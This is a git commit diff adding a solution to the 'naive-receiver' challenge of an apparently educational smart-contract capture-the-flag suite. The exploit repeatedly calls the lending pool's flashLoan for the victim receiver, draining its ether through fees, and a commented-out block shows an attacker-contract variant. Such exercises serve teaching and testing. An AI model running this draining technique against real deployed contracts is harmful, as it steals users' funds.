9d96df15078c2f8b16308edb932ca2385402edbe
ikcoin <ikcoin.kb@protonmail.com>
2021-12-29 11:42:42 +0100

    naive-receiver challenge; closes #1

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -19,18 +19,29 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('5'));
+        }
+
+        /*
+        // Attack contract deployment
+        const AttackContract = await ethers.getContractFactory('AttackerContract', attacker);
+        this.attackerContract = await AttackContract.deploy(this.receiver.address, this.pool.address);
+
+        await this.attackerContract.execute10flashLoans();
+        */
     });
 
     after(async function () {
